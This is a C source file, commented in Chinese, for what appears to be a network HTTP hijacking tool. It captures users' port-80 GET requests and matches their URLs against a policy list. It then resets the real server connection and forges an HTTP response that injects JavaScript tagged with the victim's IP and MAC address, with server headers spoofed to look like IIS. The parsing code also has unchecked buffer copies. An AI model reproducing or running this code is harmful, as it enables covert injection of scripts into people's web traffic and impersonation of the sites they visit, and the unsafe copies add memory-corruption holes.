#include "header.h"

// 各结构体的长度
unsigned int sizeof_iphdr = sizeof(struct ip);
unsigned int sizeof_tcphdr = sizeof(struct tcphdr);
unsigned int sizeof_ethhdr = sizeof(struct ethhdr);

unsigned char reinjec_mac[6] = {0};
short reinjec_mtu = 0;

// 获取http头部信息
int get_http_head(char *data, char* domain, char* value)
{
	char *temp = strstr(data, "\r\n");
	
	while(temp != NULL && temp != data){
		if( !strncasecmp(data, domain, strlen(domain) ) ){
			data += strlen(domain);
			memcpy( value, data, temp - data );
			return 0;
		}
		
		data = temp + 2;
		temp = strstr(data, "\r\n");
	}
	return -1;
}

// http过滤 返回值0为可操作域名 其他为不可操作
int filter_http(char* data, char* domain, int data_len)
{
	// 判断是不是get请求
	if( strncmp(data, "GET", 3) ){
		return -1;
	}
	
	// 取出路径
	char *data_path = data + 4;
	if( *data_path != '/' ){
		xyprintf(0, "There is an error in %s(%d) : Can not get path, *data_path = %c", __FILE__, __LINE__, *data_path);
		xyprintf_data(data, data_len);
		return -1;
	}
	
	char *temp = strchr(data_path, ' ');
	char path[1024] = {0};
	if(temp - data_path > 1000){
		return -1;
	}
	memcpy(path, data_path, temp - data_path);

	// 取出host
	char host[128] = {0};
	if( get_http_head(data, "Host: ", host) ){ // host: 
		xyprintf(0, "There is an error in %s(%d) : Can not find host!", __FILE__, __LINE__);
		//xyprintf_data(data, data_len);
		return -1;
	}

	// 组装url
	sprintf(domain, "%s%s", host, path);

/*
	// 取出请求类型
	char Accept[128] = {0};
	if( get_http_head(data, "Accept: ", Accept) ){
		xyprintf(0, "There is an error in %s(%d) : Can not find Accept!", __FILE__, __LINE__);
		return -1;
	}

//	xyprintf(0, "Accept -- %s", Accept);
*/
	return 0;
}


// 数据过滤
void* filter_thread(void* lp)
{
	pthread_detach(pthread_self());
	
	// 取出数据
	unsigned char* packet = ((struct link_packet*)lp)->packet;
	unsigned int packet_len = ((struct link_packet*)lp)->packet_len;

	// 判断数据长度 如果包的长度小于 14 + 20 + 8
	if(packet_len < 42){
		xyprintf(0, "A bad packet of len is %d", packet_len);
		goto DATA_ERR;
	}
	
// ethhdr

	// 取ethhdr 检验是否是ip数据包
	struct ethhdr* ethhdr = (struct ethhdr*)packet;
	
	if( ntohs(ethhdr->h_proto) != ETH_P_IP ){
		xyprintf(0, "A packet of type is not IP!");
		goto DATA_ERR;
	}

	// 过滤掉回注口的数据
	if( !memcmp(reinjec_mac, ethhdr->h_dest, 6) || !memcmp(reinjec_mac, ethhdr->h_source, 6) ){
		//xyprintf(0, "Local data!");
		goto DATA_ERR;
	}

// iphdr

	// 取iphdr 检验是否是tcp数据包
	struct ip* ip = (struct ip*)(packet + sizeof_ethhdr);
	
	if( ip->ip_p != IPPROTO_TCP ){
		//xyprintf(0, "A packet of type is not TCP!");
		goto DATA_ERR;
	}

	// 检查数据长度 去除 ethhdr长度应该和ip报文的长度一样
	if( packet_len - 14 != ntohs(ip->ip_len) ){
		//xyprintf(0, "A bad packet of len is %d, but ip_len is %u!", packet_len, ntohs(ip->ip_len));
		goto DATA_ERR;
	}

// tcphdr

	// 取tcphdr
	struct tcphdr* tcp = (struct tcphdr*)( ((char*)ip) + (unsigned int)(ip->ip_hl << 2) );
/*
	// 检验校验码
	// TODO 对长度大于1500的tcp校验码有问题
	unsigned short src_check = ip->ip_sum;
	unsigned short check = check_sum_ip(ip);
	if(check != src_check){
		xyprintf(0, "A bad packet of ip_sum is wrong, 0x%x -- 0x%x", check, src_check);
		goto DATA_ERR;
	}
	src_check = tcp->check;
	check = check_sum_tcp(ip, tcp);
	if(check != src_check){
		xyprintf(0, "A bad packet of ip_sum is wrong, 0x%x -- 0x%x", check, src_check);
		goto DATA_ERR;
	}
*/
	
	// 判断数据类型 过滤出来不是传输数据的包
	if( tcp->ack != 1 || tcp->psh != 1 ){
		goto DATA_ERR;
	}
	
	// 判断端口
	if( 80 != ntohs(tcp->dest)){ // && 14096 != ntohs(tcp->source) ){
		goto DATA_ERR;
	}

// data
	
	// 数据
	unsigned char *data = ((unsigned char*)tcp) + (unsigned int)(tcp->doff << 2);
	int data_len = packet_len - sizeof_ethhdr - (int)(ip->ip_hl << 2) - (int)(tcp->doff << 2);

#if 0
	xyprintf(0, "<--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b <--b");
	xyprintf_ethhdr(ethhdr);
	xyprintf_iphdr(ip);
	xyprintf_tcphdr(tcp);
	xyprintf_data(data, data_len);
	xyprintf(0, "<--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e <--e");
#endif

	// 获取访问的url
	char domain[1024] = {0};
	if( filter_http(data, domain, data_len) ){
		goto DATA_ERR;
	}

//	xyprintf(0, "%s", domain);

	// 查找链接是否在策略库中
	char* js = ruse_list_find(domain);

	if( js ){

		// 拷贝出来 然后替换里面的关键字
		char jsed[4096] = {0};
		strcpy(jsed, js);

		// userip
		char ip_src_str[32] = {0};
		strcpy(ip_src_str, inet_ntoa(ip->ip_src));
		str_replace(jsed, "<%userip%>", ip_src_str);

		// usermac
		unsigned char* h_source = ethhdr->h_source;
		char mac_src_str[64] = {0};
		snprintf(mac_src_str, 63, "%02x:%02x:%02x:%02x:%02x:%02x",
				h_source[0], h_source[1], h_source[2], h_source[3], h_source[4], h_source[5] );
		str_replace(jsed, "<%usermac%>", mac_src_str);

		// 组成回复包内容
		char buf[4096] = {0};
		snprintf(buf, 4095, "HTTP/1.1 200 OK\r\n"
				"Content-Type: application/javascript\r\n"
				"Last-Modified: Tue, 05 Jul 2016 05:52:22 GMT\r\n"
				"Accept-Ranges: bytes\r\n"
				"ETag: \"78d74f6681d6d11:0\"\r\n"
				"Server: Microsoft-IIS/8.0\r\n"
				"X-Powered-By: ASP.NET\r\n"
				"Date: Tue, 05 Jul 2016 06:02:52 GMT\r\n"
				"Content-Length: %lu\r\n\r\n%s", strlen(jsed), jsed);
		// 重置掉服务器的连接
		send_rst_test(ip, tcp, data_len);
		// 生成伪装包并发送给用户
		send_http(ip, tcp, data_len, buf);
	}
DATA_ERR:
	if(packet){
		free(packet);
	}
	if(lp){
		free(lp);
	}
	pthread_exit(NULL);
}
